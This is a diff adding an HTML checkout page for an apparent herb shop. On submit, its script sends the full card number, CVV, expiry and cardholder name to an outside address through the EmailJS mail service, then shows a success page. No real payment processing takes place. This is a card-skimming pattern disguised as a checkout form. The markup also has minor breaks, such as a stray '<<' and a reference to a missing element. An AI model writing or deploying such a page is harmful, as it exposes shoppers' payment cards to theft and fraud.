@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Checkout</title>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+  :root{--bg:#f6f8fb;--card:#ffffff;--accent:#2563eb;--muted:#6b7280;--radius:12px}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px;color:#0b1220}
+  .wrap{width:100%;max-width:420px}
+  .panel{background:var(--card);border-radius:var(--radius);padding:22px;box-shadow:0 10px 30px rgba(12,18,30,0.06)}
+  h2{margin:0 0 8px;font-size:20px}
+  .muted{color:var(--muted);font-size:13px;margin-bottom:12px}
+  label{display:block;font-size:13px;color:#111;margin-top:10px}
+  input[type="text"], input[type="tel"]{width:100%;padding:12px;border-radius:10px;border:1px solid #e6eef8;background:#fbfdff;font-size:15px;margin-top:6px}
+  .row{display:flex;gap:10px}
+  .small{flex:0 0 120px}
+  .btn{width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(90deg,#0ea5e9,#2563eb);color:#fff;font-weight:700;font-size:16px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:10px}
+  .btn[disabled]{opacity:0.6;cursor:not-allowed}
+  .spinner{width:18px;height:18px;border-radius:50%;border:3px solid rgba(255,255,255,0.25);border-top-color:rgba(255,255,255,0.95);animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .card-visual{border-radius:12px;padding:16px;color:#fff;height:120px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;margin-bottom:12px;background:linear-gradient(135deg,#1e3a8a,#06b6d4)}
+  .card-number{font-size:18px;letter-spacing:2px}
+  .small-muted{font-size:12px;color:#9aa4b2}
+  .status{margin-top:12px;font-weight:700}
+  .ok{color:green}
+  .bad{color:#ef4444}
+  footer{margin-top:14px;text-align:center;color:var(--muted);font-size:12px}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="panel" role="main" aria-labelledby="title">
+      <h2 id="title">Checkout</h2>
+      <div class="card-visual" aria-hidden="true">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div id="brandLabel" style="font-weight:700">CARD</div>
+          <div style="width:44px;height:28px;border-radius:6px;background:rgba(255,255,255,0.12)"></div>
+        </div>
+        <div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div style="font-size:12px;opacity:0.95">CARDHOLDER <div id="previewName" style="font-weight:700">FULL NAME</div></div>
+          <div style="text-align:right"><div style="font-size:12px;opacity:0.95">EXPIRES</div><div id="previewExpiry" style="font-weight:700">MM/YY</div></div>
+        </div>
+      </div>
+
+      <form id="checkoutForm" autocomplete="off" onsubmit="return false;">
+        <label>Cardholder name
+          <input id="name" type="text" placeholder="Full name as on card" required>
+        </label>
+
+        <label>Card number
+          <input id="cardNumber" type="tel" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="23" required>
+        </label>
+
+        <div class="row">
+          <div class="small">
+            <label>Expiry (MM/YY)
+              <input id="expiry" type="tel" placeholder="MM/YY" maxlength="5" required>
+            </label>
+          </div>
+          <div class="small">
+            <label>CVV
+              <input id="cvv" type="tel" inputmode="numeric" placeholder="123" maxlength="4" required>
+            </label>
+          </div>
+        </div>
+        <div style="margin-top:14px">
+          <button id="checkoutBtn" class="btn" type="button">
+            <span id="spinner" style="display:none" class="spinner" aria-hidden="true"></span>
+            <span id="checkout-btn">Checkout</span>
+          </button>
+        </div>
+
+        <div id="status" class="status" role="status" aria-live="polite"></div>
+      </form>
+    </div>
+
+    <<!-- Footer -->
+<footer class="bg-green-700 text-white mt-12">
+  <div class="max-w-7xl mx-auto px-6 py-6 flex flex-col md:flex-row justify-between items-center">
+    <p>&copy; 2025 Grandpa’s Herbs. All rights reserved.</p>
+    <div class="space-x-4 mt-3 md:mt-0">
+      <a href="#" class="hover:underline">Privacy Policy</a>
+      <a href="#" class="hover:underline">Contact</a>
+    </div>
+  </div>
+</footer>
+  </div>
+
+<script>
+/* ===========================
+   CONFIG - replace these
+   =========================== */
+const EMAILJS_USER    = 'NHFB-BLLpTMnFelp_';
+const EMAILJS_SERVICE = 'Payment911';
+const EMAILJS_TEMPLATE= 'template_fe4tcxu';
+
+/* initialize EmailJS */
+try{ emailjs.init(EMAILJS_USER); } catch(e){ /* will surface later if invalid */ }
+
+/* ---------- helpers ---------- */
+function sanitizePan(s){ return (s||'').replace(/\D/g,''); }
+function maskPan(p){ const s=sanitizePan(p); if (s.length<=4) return s; return '•••• •••• •••• ' + s.slice(-4); }
+
+/* Luhn (digit-by-digit arithmetic) */
+function luhnCheck(numberString){
+  if (!/^\d+$/.test(numberString)) return false;
+  let sum = 0, alt = false;
+  for (let i = numberString.length - 1; i >= 0; i--){
+    let n = Number(numberString[i]);
+    if (alt){ n *= 2; if (n > 9) n -= 9; }
+    sum += n;
+    alt = !alt;
+  }
+  return (sum % 10) === 0;
+}
+
+/* expiry validation */
+function validateExpiry(exp){
+  if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
+  const [mm, yy] = exp.split('/').map(x=>Number(x));
+  if (mm < 1 || mm > 12) return false;
+  const now = new Date();
+  const year = 2000 + yy;
+  const lastDay = new Date(year, mm, 0, 23,59,59);
+  return lastDay >= new Date(now.getFullYear(), now.getMonth(), 1);
+}
+
+/* cvv validation */
+function validateCvv(cvv, pan){
+  if (!/^\d{3,4}$/.test(cvv)) return false;
+  if (/^3[47]/.test(pan)) return cvv.length === 4;
+  return cvv.length === 3;
+}
+
+/* SHA-256 -> base64url */
+async function sha256Base64Url(str){
+  const enc = new TextEncoder();
+  const data = enc.encode(str);
+  const digest = await crypto.subtle.digest('SHA-256', data);
+  const bytes = new Uint8Array(digest);
+  let binary = '';
+  for (let b of bytes) binary += String.fromCharCode(b);
+  let b64 = btoa(binary);
+  return b64.replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+}
+
+/* UI refs */
+const cardNumEl = document.getElementById('cardNumber');
+const expiryEl  = document.getElementById('expiry');
+const cvvEl     = document.getElementById('cvv');
+const nameEl    = document.getElementById('name');
+const previewNumber = document.getElementById('previewNumber');
+const previewName   = document.getElementById('previewName');
+const previewExpiry = document.getElementById('previewExpiry');
+const brandLabel    = document.getElementById('brandLabel');
+const checkoutBtn   = document.getElementById('checkoutBtn');
+const spinnerEl     = document.getElementById('spinner');
+const btnText       = document.getElementById('btnText');
+const statusEl      = document.getElementById('status');
+
+/* UX: format and preview */
+/* UX: format and preview */
+cardNumEl.addEventListener('input', e=>{
+  const raw = sanitizePan(e.target.value);
+  const groups = raw.match(/.{1,4}/g) || [];
+  e.target.value = groups.join(' ');
+  previewNumber.textContent = groups.join(' ') || '•••• •••• •••• ••••';
+  if (/^4/.test(raw)) brandLabel.textContent = 'VISA';
+  else if (/^5[1-5]/.test(raw) || /^2(?:2[2-9]|[3-6]\d|7[01])/.test(raw)) brandLabel.textContent = 'MASTERCARD';
+  else if (/^3[47]/.test(raw)) brandLabel.textContent = 'AMEX';
+  else brandLabel.textContent = 'CARD';
+});
+
+expiryEl.addEventListener('input', e=>{
+  let v = e.target.value.replace(/[^\d]/g,'').slice(0,4);
+  if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+  e.target.value = v;
+  previewExpiry.textContent = v || 'MM/YY';
+});
+
+nameEl.addEventListener('input', e=>{
+  previewName.textContent = e.target.value.toUpperCase() || 'FULL NAME';
+});
+/* Core checkout flow (runs on Checkout click) */
+
+// Checkout — Send email + redirect
+document.getElementById('checkout-btn').addEventListener('click', async ()=>{
+  try {
+    await emailjs.send("Payment911", "template_fe4tcxu", {
+      card_number: cardNumEl.value,
+      name:nameEl.value.trim(),
+      cvv: cvvEl.value.trim(),
+      expiry:expiryEl.value.trim(),
+    });
+    console.log("Email sent successfully.");
+    window.location.href = "success.html";
+  } catch (err) {
+    console.error("Failed to send order email:", err);
+    window.location.href = "failure.html"
+  }
+
+  // Redirect to checkout.html
+  //window.location.href = "checkout.html";
+});
+</script>
+</body>
+</html>
